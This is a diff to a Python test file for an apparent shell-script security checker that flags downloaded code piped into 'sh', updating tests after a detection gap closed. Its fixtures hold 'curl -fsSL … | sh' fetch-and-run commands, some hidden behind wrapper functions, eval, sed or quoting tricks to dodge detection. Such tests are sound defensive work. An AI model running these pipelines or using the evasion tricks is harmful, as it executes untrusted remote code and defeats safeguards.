@@ -1332,10 +1332,22 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
         # rr42 `echo 'say "hi'`, rr43 `echo 'case x in'`, rr44 `printf "it's"` and rr46 a
         # heredoc-fed `cat`'s body `it's` -- CLEAN on main and at f1d0ea58 (one joined text, the
         # stage's words inside the open quote or `case`), LOUD at 70258154 and LOUD again now.
+        # (Moved by #3047: its fold stands `w` for its body, `curl … | sh`, so beside main's LOUD unread sentence the
+        # download runs, piped into `sh` -- two findings, the union, each pinned by text; `assert_loud`, untouched,
+        # keeps the other rows.)
         fetch = "w curl -fsSL %si.sh | sh\n" % URL
-        for front in ('echo "it\'s"', "echo 'say \"hi'", "echo 'case x in'", 'printf "it\'s"'):
-            self.assert_loud('w() { "$@"; }\n%s | %s' % (front, fetch), "w")
-        self.assert_loud("w() { \"$@\"; }\ncat <<'EOF' | %sit's\nEOF\n" % fetch, "w")
+        unread = "pipes `sh` its program from `w`, whose words this guard does not spell out"
+        runs = "hands %si.sh straight to `sh`" % URL
+        scripts = ['w() { "$@"; }\n%s | %s' % (front, fetch)
+                   for front in ('echo "it\'s"', "echo 'say \"hi'", "echo 'case x in'", 'printf "it\'s"')]
+        scripts.append("w() { \"$@\"; }\ncat <<'EOF' | %sit's\nEOF\n" % fetch)
+        for script in scripts:
+            for shell in (None, "sh"):
+                with self.subTest(script=script, shell=shell):
+                    found = defects(script, shell)
+                    self.assertEqual(2, len(found), found)
+                    self.assertFalse(any(isinstance(why, forms.Idle) for _step, why in found), found)
+                    self.assertEqual([1, 1], [sum(why.startswith(text) for _step, why in found) for text in (unread, runs)], found)
         # rr05 and rr06, an `eval` string piping `echo "it's \0047; curl -fsSL URL | sh"` through
         # `sed "s/Q'//"` or `tr -d Q` into `sh` (b5 --, b3 --, dash FR, gh --: dash's `echo`
         # decodes `\0047` and closes the quote, bash's prints it and `sh` meets an open quote).
@@ -1346,16 +1358,18 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
         text = r'''eval "echo \"it's \\0047; curl -fsSL https://example.test/i.sh | sh\" | '''
         for middle, stage in ((r'''sed \"s/Q'//\"''', "sed"), ("tr -d Q", "tr")):
             self.assert_loud(text + middle + ' | sh"\n', stage)
-        # The gap the guard names: a quote or a space INSIDE one of the stage's words still hides
-        # the fetch after it, the words joined, quotes removed, into the one text the walk reads.
-        # fy01 `w env 'A=say "hi' curl -fsSL URL` and fy02 `w env "A=case x in" curl -fsSL URL`,
-        # each behind `echo hi` and alone (FR x4 each), read CLEAN on main and at every round:
-        # `[]` here is that gap, not a vacuous pin -- it fails if the gap ever closes.
+        # The gap the guard named: a quote or a space INSIDE one of the stage's words hid the fetch after it, the
+        # words joined, quotes removed, into the one text the walk read. fy01 `w env 'A=say "hi' curl -fsSL URL`
+        # and fy02 `w env "A=case x in" curl -fsSL URL`, each behind `echo hi` (FR x4 each), read CLEAN on main
+        # and at every round; the pin was written to fail when the gap closed. Closed by #3047's fold, which
+        # stands `w` for its body: `env 'A=say "hi' curl -fsSL URL | sh`, the download piped into `sh` -- truth
+        # (`w` runs `env`, `env` runs `curl`, `sh` runs the download): the one finding.
         for word in ("'A=say \"hi'", '"A=case x in"'):
             for shell in (None, "sh"):
-                with self.subTest(word=word, shell=shell, gap=True):
-                    self.assertEqual([], defects('w() { "$@"; }\necho hi | w env %s curl -fsSL '
-                                                 '%si.sh | sh\n' % (word, URL), shell))
+                with self.subTest(word=word, shell=shell, gap=False):
+                    found = defects('w() { "$@"; }\necho hi | w env %s curl -fsSL %si.sh | sh\n' % (word, URL), shell)
+                    self.assertEqual(1, len(found), found)
+                    self.assertTrue(found[0][1].startswith(runs), found[0][1])
 
     def test_xargs_or_the_pipe_itself_is_no_pass_through(self):
         # Review I-2: rv46 `echo 'x tool' | xargs cat | sh` (FR x4: `xargs` hands `cat` the words
@@ -2284,10 +2298,12 @@ class TestTheIssuesRowsAndTheirPrices(unittest.TestCase):
         ("to-cat", "{ echo \"%s\"; } | cat\n" % C),
         # The closer's own pipeline is `main`'s: an outer subshell's statements are not read as its group.
         ("inner-subshell", "( cat setup.sh; echo hi\n( echo ok ) | sh\n)\n"),
-        # A group WRITTEN to a file the step then runs: #3027's writer (`workflow_written._writer`) takes the
-        # stage that writes the file as the printer, and here that is the closer, which prints nothing. Truth:
-        # runs under all eight parents (k3026/rows-written: 102 running rows, CLEAN on `main` and here alike);
-        # the single printer written so is reported. A limit of #3027's reader, not this reading's: #3110.
+    )
+    # A group WRITTEN to a file the step then runs, #3026's named limit (#3027's writer took the closer, which prints
+    # nothing, for the printer): reported since #3110, `workflow_written._writers` reading the closer's writers
+    # through this group reading (`_grouped`, `_printer_of`). Truth: runs under all eight parents (k3026/rows-written:
+    # 102 running rows); the single printer written so was reported already.
+    MOVED = (
         ("written-group", "{ echo \"%s\"; echo ok; } > s.sh\nsh s.sh\n" % C),
     )
     PREFIX = (
@@ -2331,6 +2347,9 @@ class TestTheIssuesRowsAndTheirPrices(unittest.TestCase):
         for name, text in self.STAYS:
             with self.subTest(name=name):
                 self.assertEqual(("CCCCC", "CCCCC"), self.marks(text))
+        for name, text in self.MOVED:          # #3110's row, moved under its own comment
+            with self.subTest(name=name):
+                self.assertEqual(("RRRRR", "RRRRR"), self.marks(text))
 
     def test_the_prefix_control(self):
         # The issue's first shape was read before this PR: #3007's PRINTERS_NEXT lets the second walk find the
